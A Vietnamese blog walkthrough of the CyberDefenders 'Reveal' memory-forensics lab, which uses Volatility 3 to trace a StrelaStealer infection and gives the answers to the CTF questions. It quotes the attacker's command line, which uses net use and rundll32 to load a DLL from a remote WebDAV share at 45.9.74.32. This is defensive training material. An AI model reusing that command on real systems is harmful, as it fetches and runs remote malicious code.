<!doctype html>
<html lang="en" dir="ltr" class="docs-wrapper plugin-docs plugin-id-default docs-version-current docs-doc-page docs-doc-id-cyberdefenders-training/Reveal-lab" data-has-hydrated="false">
<head>
<meta charset="UTF-8">
<meta name="generator" content="Docusaurus v3.7.0">
<title data-rh="true">Reveal Lab | little Whale&#x27;s Site</title><meta data-rh="true" name="viewport" content="width=device-width,initial-scale=1"><meta data-rh="true" name="twitter:card" content="summary_large_image"><meta data-rh="true" property="og:image" content="https://ThienAnUIT2022.github.io/img/docusaurus-social-card.jpg"><meta data-rh="true" name="twitter:image" content="https://ThienAnUIT2022.github.io/img/docusaurus-social-card.jpg"><meta data-rh="true" property="og:url" content="https://ThienAnUIT2022.github.io/docs/cyberdefenders-training/Reveal-lab"><meta data-rh="true" property="og:locale" content="en"><meta data-rh="true" name="docusaurus_locale" content="en"><meta data-rh="true" name="docsearch:language" content="en"><meta data-rh="true" name="docusaurus_version" content="current"><meta data-rh="true" name="docusaurus_tag" content="docs-default-current"><meta data-rh="true" name="docsearch:version" content="current"><meta data-rh="true" name="docsearch:docusaurus_tag" content="docs-default-current"><meta data-rh="true" property="og:title" content="Reveal Lab | little Whale&#x27;s Site"><meta data-rh="true" name="description" content="Hello mọi người, cùng tôi và cậu ấy giải bài tập CTF nhé3"><meta data-rh="true" property="og:description" content="Hello mọi người, cùng tôi và cậu ấy giải bài tập CTF nhé3"><link data-rh="true" rel="icon" href="/img/favicon.ico"><link data-rh="true" rel="canonical" href="https://ThienAnUIT2022.github.io/docs/cyberdefenders-training/Reveal-lab"><link data-rh="true" rel="alternate" href="https://ThienAnUIT2022.github.io/docs/cyberdefenders-training/Reveal-lab" hreflang="en"><link data-rh="true" rel="alternate" href="https://ThienAnUIT2022.github.io/docs/cyberdefenders-training/Reveal-lab" hreflang="x-default"><link rel="alternate" type="application/rss+xml" href="/blog/rss.xml" title="little Whale&#39;s Site RSS Feed">
<link rel="alternate" type="application/atom+xml" href="/blog/atom.xml" title="little Whale&#39;s Site Atom Feed">





<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.13.24/dist/katex.min.css" integrity="sha384-odtC+0UGzzFL/6PNoE8rX/SPcQDXBJ+uRepguP4QkPCm2LBxH3FA3y+fKSiJ+AmM" crossorigin="anonymous"><link rel="stylesheet" href="/assets/css/styles.aff420c1.css">
<script src="/assets/js/runtime~main.de46093f.js" defer="defer"></script>
<script src="/assets/js/main.6f9350f6.js" defer="defer"></script>
</head>
<body class="navigation-with-keyboard">
<script>!function(){function t(t){document.documentElement.setAttribute("data-theme",t)}var e=function(){try{return new URLSearchParams(window.location.search).get("docusaurus-theme")}catch(t){}}()||function(){try{return window.localStorage.getItem("theme")}catch(t){}}();t(null!==e?e:"light")}(),function(){try{const n=new URLSearchParams(window.location.search).entries();for(var[t,e]of n)if(t.startsWith("docusaurus-data-")){var a=t.replace("docusaurus-data-","data-");document.documentElement.setAttribute(a,e)}}catch(t){}}()</script><div id="__docusaurus"><link rel="preload" as="image" href="/img/logo.svg"><div role="region" aria-label="Skip to main content"><a class="skipToContent_fXgn" href="#__docusaurus_skipToContent_fallback">Skip to main content</a></div><nav aria-label="Main" class="navbar navbar--fixed-top"><div class="navbar__inner"><div class="navbar__items"><button aria-label="Toggle navigation bar" aria-expanded="false" class="navbar__toggle clean-btn" type="button"><svg width="30" height="30" viewBox="0 0 30 30" aria-hidden="true"><path stroke="currentColor" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" d="M4 7h22M4 15h22M4 23h22"></path></svg></button><a class="navbar__brand" href="/"><div class="navbar__logo"><img src="/img/logo.svg" alt="My Site Logo" class="themedComponent_mlkZ themedComponent--light_NVdE"><img src="/img/logo.svg" alt="My Site Logo" class="themedComponent_mlkZ themedComponent--dark_xIcU"></div><b class="navbar__title text--truncate">My Site</b></a><a aria-current="page" class="navbar__item navbar__link navbar__link--active" href="/docs/portfolio">Study with little Whale</a><a class="navbar__item navbar__link" href="/blog">little Whale&#x27;s autobiography</a></div><div class="navbar__items navbar__items--right"><a href="https://github.com/facebook/docusaurus" target="_blank" rel="noopener noreferrer" class="navbar__item navbar__link">GitHub<svg width="13.5" height="13.5" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_nPIU"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></a><div class="toggle_vylO colorModeToggle_DEke"><button class="clean-btn toggleButton_gllP toggleButtonDisabled_aARS" type="button" disabled="" title="Switch between dark and light mode (currently light mode)" aria-label="Switch between dark and light mode (currently light mode)" aria-live="polite" aria-pressed="false"><svg viewBox="0 0 24 24" width="24" height="24" class="lightToggleIcon_pyhR"><path fill="currentColor" d="M12,9c1.65,0,3,1.35,3,3s-1.35,3-3,3s-3-1.35-3-3S10.35,9,12,9 M12,7c-2.76,0-5,2.24-5,5s2.24,5,5,5s5-2.24,5-5 S14.76,7,12,7L12,7z M2,13l2,0c0.55,0,1-0.45,1-1s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S1.45,13,2,13z M20,13l2,0c0.55,0,1-0.45,1-1 s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S19.45,13,20,13z M11,2v2c0,0.55,0.45,1,1,1s1-0.45,1-1V2c0-0.55-0.45-1-1-1S11,1.45,11,2z M11,20v2c0,0.55,0.45,1,1,1s1-0.45,1-1v-2c0-0.55-0.45-1-1-1C11.45,19,11,19.45,11,20z M5.99,4.58c-0.39-0.39-1.03-0.39-1.41,0 c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0s0.39-1.03,0-1.41L5.99,4.58z M18.36,16.95 c-0.39-0.39-1.03-0.39-1.41,0c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0c0.39-0.39,0.39-1.03,0-1.41 L18.36,16.95z M19.42,5.99c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06c-0.39,0.39-0.39,1.03,0,1.41 s1.03,0.39,1.41,0L19.42,5.99z M7.05,18.36c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06 c-0.39,0.39-0.39,1.03,0,1.41s1.03,0.39,1.41,0L7.05,18.36z"></path></svg><svg viewBox="0 0 24 24" width="24" height="24" class="darkToggleIcon_wfgR"><path fill="currentColor" d="M9.37,5.51C9.19,6.15,9.1,6.82,9.1,7.5c0,4.08,3.32,7.4,7.4,7.4c0.68,0,1.35-0.09,1.99-0.27C17.45,17.19,14.93,19,12,19 c-3.86,0-7-3.14-7-7C5,9.07,6.81,6.55,9.37,5.51z M12,3c-4.97,0-9,4.03-9,9s4.03,9,9,9s9-4.03,9-9c0-0.46-0.04-0.92-0.1-1.36 c-0.98,1.37-2.58,2.26-4.4,2.26c-2.98,0-5.4-2.42-5.4-5.4c0-1.81,0.89-3.42,2.26-4.4C12.92,3.04,12.46,3,12,3L12,3z"></path></svg></button></div><div class="navbarSearchContainer_Bca1"><div class="navbar__search searchBarContainer_NW3z" dir="ltr"><input placeholder="Search" aria-label="Search" class="navbar__search-input searchInput_YFbd" value=""><div class="loadingRing_RJI3 searchBarLoadingRing_YnHq"><div></div><div></div><div></div><div></div></div></div></div></div></div><div role="presentation" class="navbar-sidebar__backdrop"></div></nav><div id="__docusaurus_skipToContent_fallback" class="main-wrapper mainWrapper_z2l0"><div class="docsWrapper_hBAB"><button aria-label="Scroll back to top" class="clean-btn theme-back-to-top-button backToTopButton_sjWU" type="button"></button><div class="docRoot_UBD9"><aside class="theme-doc-sidebar-container docSidebarContainer_YfHR"><div class="sidebarViewport_aRkj"><div class="sidebar_njMd"><nav aria-label="Docs sidebar" class="menu thin-scrollbar menu_SIkG"><ul class="theme-doc-sidebar-menu menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-1 menu__list-item"><a class="menu__link" href="/docs/portfolio">I&#x27;m little Whale :3</a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" href="/docs/category/gg-cybersec-cert">GG CyberSec Cert</a><button aria-label="Expand sidebar category &#x27;GG CyberSec Cert&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" href="/docs/category/letsdefend-soc-analyst">LetsDefend SOC Analyst</a><button aria-label="Expand sidebar category &#x27;LetsDefend SOC Analyst&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--active" href="/docs/category/cyberdefenders-training">CyberDefenders Training</a><button aria-label="Collapse sidebar category &#x27;CyberDefenders Training&#x27;" aria-expanded="true" type="button" class="clean-btn menu__caret"></button></div><ul style="display:block;overflow:visible;height:auto" class="menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link menu__link--active" aria-current="page" tabindex="0" href="/docs/cyberdefenders-training/Reveal-lab">Reveal Lab</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/cyberdefenders-training/IcedID-lab">IcedID Lab</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/cyberdefenders-training/TomcatTakeover-lab">TomcatTakeover Lab</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/cyberdefenders-training/wireshark-cheatsheet">Wireshark Cheatsheet</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/cyberdefenders-training/setting-lab">Set up Kali virtual machine for labs</a></li></ul></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" href="/docs/category/nt114---endpoint-security">NT114 - Endpoint Security</a><button aria-label="Expand sidebar category &#x27;NT114 - Endpoint Security&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" href="/docs/category/nt207---risk-management--infosec">NT207 - Risk Management &amp; InfoSec</a><button aria-label="Expand sidebar category &#x27;NT207 - Risk Management &amp; InfoSec&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li></ul></nav></div></div></aside><main class="docMainContainer_TBSr"><div class="container padding-top--md padding-bottom--lg"><div class="row"><div class="col docItemCol_VOVn"><div class="docItemContainer_Djhp"><article><nav class="theme-doc-breadcrumbs breadcrumbsContainer_Z_bl" aria-label="Breadcrumbs"><ul class="breadcrumbs" itemscope="" itemtype="https://schema.org/BreadcrumbList"><li class="breadcrumbs__item"><a aria-label="Home page" class="breadcrumbs__link" href="/"><svg viewBox="0 0 24 24" class="breadcrumbHomeIcon_YNFT"><path d="M10 19v-5h4v5c0 .55.45 1 1 1h3c.55 0 1-.45 1-1v-7h1.7c.46 0 .68-.57.33-.87L12.67 3.6c-.38-.34-.96-.34-1.34 0l-8.36 7.53c-.34.3-.13.87.33.87H5v7c0 .55.45 1 1 1h3c.55 0 1-.45 1-1z" fill="currentColor"></path></svg></a></li><li itemscope="" itemprop="itemListElement" itemtype="https://schema.org/ListItem" class="breadcrumbs__item"><a class="breadcrumbs__link" itemprop="item" href="/docs/category/cyberdefenders-training"><span itemprop="name">CyberDefenders Training</span></a><meta itemprop="position" content="1"></li><li itemscope="" itemprop="itemListElement" itemtype="https://schema.org/ListItem" class="breadcrumbs__item breadcrumbs__item--active"><span class="breadcrumbs__link" itemprop="name">Reveal Lab</span><meta itemprop="position" content="2"></li></ul></nav><div class="tocCollapsible_ETCw theme-doc-toc-mobile tocMobile_ITEo"><button type="button" class="clean-btn tocCollapsibleButton_TO0P">On this page</button></div><div class="theme-doc-markdown markdown"><header><h1>Reveal Lab</h1></header><p>Hello mọi người, cùng tôi và cậu ấy giải bài tập CTF nhé :3. Giới thiệu chút thì bài này là<a href="https://cyberdefenders.org/blueteam-ctf-challenges/reveal/" target="_blank" rel="noopener noreferrer">Reveal Lab</a>, thuộc loại Endpoint Forensics, mức dễ. Bài này thì cũng có <a href="https://cyberdefenders.org/walkthroughs/reveal/" target="_blank" rel="noopener noreferrer">hướng dẫn chính thức</a> rồi, nên tôi và cậu ấy sẽ viết lại quá trình suy nghĩ của mình cũng như những thông tin chúng tôi thấy quan trọng. Bắt đầu nhé :3</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="ngữ-cảnh">Ngữ cảnh<a href="#ngữ-cảnh" class="hash-link" aria-label="Direct link to Ngữ cảnh" title="Direct link to Ngữ cảnh">​</a></h2>
<p>Bạn là một forensic investigator tại một tổ chức tài chính và SIEM của bạn gắn flag hoạt động bất thường trên máy trạm (workstation) có quyền truy cập vào dữ liệu tài chính nhạy cảm. Nghi ngờ đó là một hành vi vi phạm, bạn đã nhận được một file .dmp xuất từ bộ nhớ của máy bị xâm phạm. Nhiệm vụ của bạn là phân tích bộ nhớ cho các dấu hiệu xâm phạm, theo dõi nguồn gốc của hành vi bất thường và đánh giá phạm vi của nó để quản lý sự cố một cách hiệu quả.</p>
<hr>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="️-công-cụ-sử-dụng">🛠️ Công cụ sử dụng<a href="#️-công-cụ-sử-dụng" class="hash-link" aria-label="Direct link to 🛠️ Công cụ sử dụng" title="Direct link to 🛠️ Công cụ sử dụng">​</a></h2>
<p>Volatility 3 là một framework pháp y bộ nhớ được sử dụng rộng rãi trong điều tra số để phân tích dữ liệu từ RAM dumps. Công cụ này giúp các chuyên gia bảo mật kiểm tra và phát hiện dấu vết hoạt động đáng ngờ trên hệ thống.</p>
<p><img decoding="async" loading="lazy" alt="Install Volatility 3" src="/assets/images/Reveal-e0f60bc8f31c586f1f02228692f6e86b.png" width="762" height="302" class="img_ev3q"></p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="cách-volatility-3-xử-lý-bộ-nhớ">Cách Volatility 3 xử lý bộ nhớ<a href="#cách-volatility-3-xử-lý-bộ-nhớ" class="hash-link" aria-label="Direct link to Cách Volatility 3 xử lý bộ nhớ" title="Direct link to Cách Volatility 3 xử lý bộ nhớ">​</a></h3>
<ul>
<li><strong>Xác định hệ điều hành:</strong> Volatility 3 tự động nhận diện OS profile để diễn giải đúng cấu trúc dữ liệu trong bộ nhớ.</li>
<li><strong>Sử dụng Symbol Tables:</strong> Symbol tables giúp phân tích chính xác layout của bộ nhớ trên các phiên bản hệ điều hành khác nhau.</li>
</ul>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="cách-volatility-3-sử-dụng-plugins-để-phân-tách-dữ-liệu">Cách Volatility 3 sử dụng Plugins để phân tách dữ liệu<a href="#cách-volatility-3-sử-dụng-plugins-để-phân-tách-dữ-liệu" class="hash-link" aria-label="Direct link to Cách Volatility 3 sử dụng Plugins để phân tách dữ liệu" title="Direct link to Cách Volatility 3 sử dụng Plugins để phân tách dữ liệu">​</a></h3>
<ul>
<li><strong>Plugin Execution:</strong> Mỗi plugin đảm nhiệm một tác vụ cụ thể như liệt kê tiến trình, kiểm tra kết nối mạng, hoặc phân tích DLL đã tải.</li>
<li><strong>Output và Phân Tích:</strong> Plugins trích xuất thông tin có giá trị để giúp điều tra hành vi hệ thống và phát hiện mã độc.</li>
</ul>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="-cheatsheet-có-thể-giúp-bạn-volatility-3">📜 Cheatsheet có thể giúp bạn Volatility 3:<a href="#-cheatsheet-có-thể-giúp-bạn-volatility-3" class="hash-link" aria-label="Direct link to 📜 Cheatsheet có thể giúp bạn Volatility 3:" title="Direct link to 📜 Cheatsheet có thể giúp bạn Volatility 3:">​</a></h3>
<ul>
<li><a href="https://blog.onfvp.com/post/volatility-cheatsheet/" target="_blank" rel="noopener noreferrer">Ashley Pearson Cheatsheet</a></li>
<li><a href="https://book.hacktricks.xyz/generic-methodologies-and-resources/basic-forensic-methodology/memory-dump-analysis/volatility-cheatsheet" target="_blank" rel="noopener noreferrer">Hacktricks Cheatsheet</a></li>
</ul>
<hr>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="-quá-trình-phân-tích">🔬 Quá trình phân tích<a href="#-quá-trình-phân-tích" class="hash-link" aria-label="Direct link to 🔬 Quá trình phân tích" title="Direct link to 🔬 Quá trình phân tích">​</a></h2>
<p>Là một người điều tra, bạn phải tự hỏi mình ba câu hỏi chính:</p>
<ul>
<li><strong>What</strong> - Bạn đang tìm kiếm điều gì? (ví dụ: một loại tệp cụ thể, tên người dùng, ...)</li>
<li><strong>Where</strong> - Bạn sẽ tìm thấy bằng chứng tấn công ở đâu? (ví dụ: bộ nhớ, dựa trên máy chủ, mạng, ...)</li>
<li><strong>How</strong> - Bạn có thể làm thế nào để thao tác dữ liệu và xem nó?</li>
</ul>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="-câu-1-xác-định-tên-của-tiến-trình-độc-hại-giúp-hiểu-bản-chất-của-cuộc-tấn-công-tên-của-tiến-trình-độc-hại-là-gì">🔍 Câu 1: Xác định tên của tiến trình độc hại giúp hiểu bản chất của cuộc tấn công. Tên của tiến trình độc hại là gì?<a href="#-câu-1-xác-định-tên-của-tiến-trình-độc-hại-giúp-hiểu-bản-chất-của-cuộc-tấn-công-tên-của-tiến-trình-độc-hại-là-gì" class="hash-link" aria-label="Direct link to 🔍 Câu 1: Xác định tên của tiến trình độc hại giúp hiểu bản chất của cuộc tấn công. Tên của tiến trình độc hại là gì?" title="Direct link to 🔍 Câu 1: Xác định tên của tiến trình độc hại giúp hiểu bản chất của cuộc tấn công. Tên của tiến trình độc hại là gì?">​</a></h3>
<table><thead><tr><th>Trả lời</th><th>powershell.exe</th></tr></thead></table>
<p>Thú thật với mọi người thì đây là lần đầu tôi và đụng tới file .dmp này và công cụ Volatility 3 lun á <!-- -->:v<!-- --> Trước giờ có nghe nhắc đến nhưng chưa có cơ hội trải nghiệm.</p>
<p>Cứ bắt tay vào làm trước đã, theo như hướng dẫn ở trên, tôi hỏi cậu ấy 3 câu hỏi:</p>
<ul>
<li><strong>Tìm cái gì:</strong> quá trình độc hại - malicious process.</li>
<li><strong>Tìm ở đâu:</strong> Trong file .dmp được cung cấp, chắc chắn rồi <!-- -->:v</li>
<li><strong>Làm thế nào:</strong> Trước tiên phải xác định được tiến trình thế nào là độc hại và bình thường đã, theo gợi ý thì tôi có thể search ở trang <a href="https://sansorg.egnyte.com/dl/WFdH1hHnQI" target="_blank" rel="noopener noreferrer">SANS</a>, đây là trang tổng hợp đặc điểm nhận dạng của các tiến trình độc hại. Dò thủ công thì khó phát hiện và tốn thời gian, tôi cần ưu tiên tốc độ nên sẽ dùng Volatility3, câu lệnh sẽ là:</li>
</ul>
<p><code>vol -f /home/vita/Downloads/192-Reveal.dmp windows.malfind</code></p>
<p>Sau khi chạy câu lệnh thì có vài kết quả như RuntimeBroker, thunderbird và powershell. Thử nhập kết quả lần lượt thì powershell là đáp án chính xác. <!-- -->:v<!-- --> Thực tế thì sẽ phải kiểm tra mọi kết quả nhé mọi người.
<img decoding="async" loading="lazy" alt="malfind command" src="/assets/images/Reveal(2)-51a363302d0019455dd64b213d4a5079.png" width="1918" height="772" class="img_ev3q">
<img decoding="async" loading="lazy" alt="malfind command2" src="/assets/images/Reveal(3)-d160dd4f3fb497513f77473d2f9cc93b.png" width="1917" height="792" class="img_ev3q"></p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="-câu-2-biết-id-tiến-trình-cha-ppid-của-tiến-trình-độc-hại-hỗ-trợ-theo-dõi-phân-cấp-tiến-trình-và-hiểu-được-luồng-tấn-công-pid-cha-của-tiến-trình-độc-hại-là-gì">🔍 Câu 2: Biết ID tiến trình cha (PPID) của tiến trình độc hại hỗ trợ theo dõi, phân cấp tiến trình và hiểu được luồng tấn công. PID cha của tiến trình độc hại là gì?<a href="#-câu-2-biết-id-tiến-trình-cha-ppid-của-tiến-trình-độc-hại-hỗ-trợ-theo-dõi-phân-cấp-tiến-trình-và-hiểu-được-luồng-tấn-công-pid-cha-của-tiến-trình-độc-hại-là-gì" class="hash-link" aria-label="Direct link to 🔍 Câu 2: Biết ID tiến trình cha (PPID) của tiến trình độc hại hỗ trợ theo dõi, phân cấp tiến trình và hiểu được luồng tấn công. PID cha của tiến trình độc hại là gì?" title="Direct link to 🔍 Câu 2: Biết ID tiến trình cha (PPID) của tiến trình độc hại hỗ trợ theo dõi, phân cấp tiến trình và hiểu được luồng tấn công. PID cha của tiến trình độc hại là gì?">​</a></h3>
<table><thead><tr><th>Trả lời</th><th>4120</th></tr></thead></table>
<ul>
<li><strong>Tìm cái gì:</strong> PID cha của tiến trình độc hại.</li>
<li><strong>Tìm ở đâu:</strong> Trong file .dmp được cung cấp, chắc chắn rồi <!-- -->:v</li>
<li><strong>Làm thế nào:</strong> Volatility3 có hỗ trợ xác định cây tiến trình nên tôi sẽ tận dụng chức năng này, với lại tiến trình powershell.exe trên có PID là 3692 nên tôi sẽ lọc ra những thông tin liên quan tới PID này thôi.</li>
</ul>
<p><code>vol -f /home/vita/Downloads/192-Reveal.dmp windows.pstree | grep &quot;3692&quot;</code></p>
<p><img decoding="async" loading="lazy" alt="PPID" src="/assets/images/Reveal(4)-cd6b6573c8658cf13b15918464cf06c7.png" width="1918" height="206" class="img_ev3q"></p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="-q3-tệp-tin-nào-được-sử-dụng-để-thực-thi-payload-giai-đoạn-hai">🔍 Q3: Tệp tin nào được sử dụng để thực thi payload giai đoạn hai?<a href="#-q3-tệp-tin-nào-được-sử-dụng-để-thực-thi-payload-giai-đoạn-hai" class="hash-link" aria-label="Direct link to 🔍 Q3: Tệp tin nào được sử dụng để thực thi payload giai đoạn hai?" title="Direct link to 🔍 Q3: Tệp tin nào được sử dụng để thực thi payload giai đoạn hai?">​</a></h3>
<table><thead><tr><th>Trả lời</th><th>3435.dll</th></tr></thead></table>
<ul>
<li><strong>Tìm cái gì:</strong> Tên file thực thi payload giai đoạn hai.</li>
<li><strong>Tìm ở đâu:</strong> Lệnh thực thi của powershell ban đầu.</li>
<li><strong>Tìm thế nào:</strong> Thật ra thì thông tin chi tiết của tiến trình cũng có hiển thị ở đáp án câu trước, nhưng mà hơi thừa thông tin và khó nhìn, nên thôi người ta có chức năng nào thì mình dùng đúng chức năng đó <!-- -->:v<!-- --> theo kết quả tìm được thì &quot;rundll32 \45.9.74.32@8888\davwwwroot\3435.dll,entry&quot; là sử dụng rundll32.exe để chạy file 3435.dll, vì rundll32.exe là một tiện ích của Windows nên có thể tránh bị phát hiện.</li>
</ul>
<p><code>vol -f /home/vita/Downloads/192-Reveal.dmp windows.cmdline | grep &quot;3692&quot;</code></p>
<p><img decoding="async" loading="lazy" alt="cmd line" src="/assets/images/Reveal(5)-1e5008fe66c90ad081b71d0819a6f800.png" width="956" height="117" class="img_ev3q"></p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="-q4-tên-thư-mục-chia-sẻ-được-truy-cập-trên-máy-chủ-từ-xa">🔍 Q4: Tên thư mục chia sẻ được truy cập trên máy chủ từ xa?<a href="#-q4-tên-thư-mục-chia-sẻ-được-truy-cập-trên-máy-chủ-từ-xa" class="hash-link" aria-label="Direct link to 🔍 Q4: Tên thư mục chia sẻ được truy cập trên máy chủ từ xa?" title="Direct link to 🔍 Q4: Tên thư mục chia sẻ được truy cập trên máy chủ từ xa?">​</a></h3>
<table><thead><tr><th>Trả lời</th><th>davwwwroot</th></tr></thead></table>
<ul>
<li><strong>Tìm cái gì:</strong> Tên thư mục chia sẻ được truy cập.</li>
<li><strong>Tìm ở đâu:</strong> tương tự như trên, vì câu lệnh vẫn chưa phân tích hết.</li>
<li><strong>Tìm thế nào:</strong> Trong câu lệnh lúc nãy có phần &quot;net use \45.9.74.32@8888\davwwwroot&quot; dễ nhận thấy được net trong network và dãy IP với port, nên có thể lờ mờ đoán được đây là kết nối tới máy chủ của attacker, và phần phía sau là đường dẫn thư mục.</li>
</ul>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="-q5-mã-kỹ-thuật-mitre-attck-liên-quan-đến-phương-thức-thực-thi-này">🔍 Q5: Mã kỹ thuật MITRE ATT&amp;CK liên quan đến phương thức thực thi này?<a href="#-q5-mã-kỹ-thuật-mitre-attck-liên-quan-đến-phương-thức-thực-thi-này" class="hash-link" aria-label="Direct link to 🔍 Q5: Mã kỹ thuật MITRE ATT&amp;CK liên quan đến phương thức thực thi này?" title="Direct link to 🔍 Q5: Mã kỹ thuật MITRE ATT&amp;CK liên quan đến phương thức thực thi này?">​</a></h3>
<table><thead><tr><th>Trả lời</th><th>T1218.011</th></tr></thead></table>
<ul>
<li><strong>Tìm cái gì:</strong> Mã sub-technique của MITRE ATT&amp;CK liên quan đến phương thức thực thi.</li>
<li><strong>Tìm ở đâu:</strong> dựa tên cách rundll32.exe được sử dụng để thực thi DLL từ xa và</li>
<li><strong>Tìm thế nào:</strong> truy cập vào trang <a href="https://attack.mitre.org/techniques/T1218/011/" target="_blank" rel="noopener noreferrer">attack.mitre.org</a> để tìm, từ khóa là rundll32.exe.</li>
</ul>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="-q6-tên-người-dùng-mà-quá-trình-độc-hại-chạy-dưới-quyền-của-người-đó">🔍 Q6: Tên người dùng mà quá trình độc hại chạy dưới quyền của người đó?<a href="#-q6-tên-người-dùng-mà-quá-trình-độc-hại-chạy-dưới-quyền-của-người-đó" class="hash-link" aria-label="Direct link to 🔍 Q6: Tên người dùng mà quá trình độc hại chạy dưới quyền của người đó?" title="Direct link to 🔍 Q6: Tên người dùng mà quá trình độc hại chạy dưới quyền của người đó?">​</a></h3>
<table><thead><tr><th>Trả lời</th><th>Elon</th></tr></thead></table>
<ul>
<li><strong>Tìm cái gì:</strong> Tài khoản người dùng.</li>
<li><strong>Tìm ở đâu:</strong> The Security Identifiers (SIDs) liên kết với quá trình.</li>
<li><strong>Tìm thế nào:</strong> rất may là Volatility cũng hỗ trợ chức năng tìm theo SIDs nên tôi sẽ sử dụng nó, và vẫn lọc thông tin theo PID 3692 của powershell.exe ban đầu. Theo kết quả thì thấy được người dùng là <strong>Elon</strong>, với SID S-1-5-21-3274565340-3808842250-3617890653-1001, quyền truy cập vào Domain, quyền Administrator và thậm chí là quyền hệ thống!?</li>
</ul>
<p><code>vol -f /home/vita/Downloads/192-Reveal.dmp windows.getsids.GetSIDs | grep &quot;3692&quot;</code></p>
<p><img decoding="async" loading="lazy" alt="SIDs" src="/assets/images/Reveal(6)-e8d40c87a590d2dcbce56ab1a44d1b9b.png" width="962" height="446" class="img_ev3q"></p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="-q7-tên-của-malware-family">🔍 Q7: Tên của malware family?<a href="#-q7-tên-của-malware-family" class="hash-link" aria-label="Direct link to 🔍 Q7: Tên của malware family?" title="Direct link to 🔍 Q7: Tên của malware family?">​</a></h3>
<table><thead><tr><th>Trả lời</th><th>StrelaStealer</th></tr></thead></table>
<ul>
<li><strong>Tìm cái gì:</strong> Tên của họ malware (họ hàng ấy nha) liên quan đến cuộc tấn công.</li>
<li><strong>Tìm ở đâu:</strong> Dữ liệu từ <strong>VirusTotal</strong> và các trang có Threat Intelligence reports.</li>
<li><strong>Tìm thế nào:</strong> kiểm tra địa chỉ IP độc hại 45.9.74.32 trên VirusTotal.</li>
</ul></div><footer class="theme-doc-footer docusaurus-mt-lg"><div class="row margin-top--sm theme-doc-footer-edit-meta-row"><div class="col"><a href="https://github.com/facebook/docusaurus/tree/main/packages/create-docusaurus/templates/shared/docs/cyberdefenders-training/Reveal-lab.md" target="_blank" rel="noopener noreferrer" class="theme-edit-this-page"><svg fill="currentColor" height="20" width="20" viewBox="0 0 40 40" class="iconEdit_Z9Sw" aria-hidden="true"><g><path d="m34.5 11.7l-3 3.1-6.3-6.3 3.1-3q0.5-0.5 1.2-0.5t1.1 0.5l3.9 3.9q0.5 0.4 0.5 1.1t-0.5 1.2z m-29.5 17.1l18.4-18.5 6.3 6.3-18.4 18.4h-6.3v-6.2z"></path></g></svg>Edit this page</a></div><div class="col lastUpdated_JAkA"></div></div></footer></article><nav class="pagination-nav docusaurus-mt-lg" aria-label="Docs pages"><a class="pagination-nav__link pagination-nav__link--prev" href="/docs/category/cyberdefenders-training"><div class="pagination-nav__sublabel">Previous</div><div class="pagination-nav__label">CyberDefenders Training</div></a><a class="pagination-nav__link pagination-nav__link--next" href="/docs/cyberdefenders-training/IcedID-lab"><div class="pagination-nav__sublabel">Next</div><div class="pagination-nav__label">IcedID Lab</div></a></nav></div></div><div class="col col--3"><div class="tableOfContents_bqdL thin-scrollbar theme-doc-toc-desktop"><ul class="table-of-contents table-of-contents__left-border"><li><a href="#ngữ-cảnh" class="table-of-contents__link toc-highlight">Ngữ cảnh</a></li><li><a 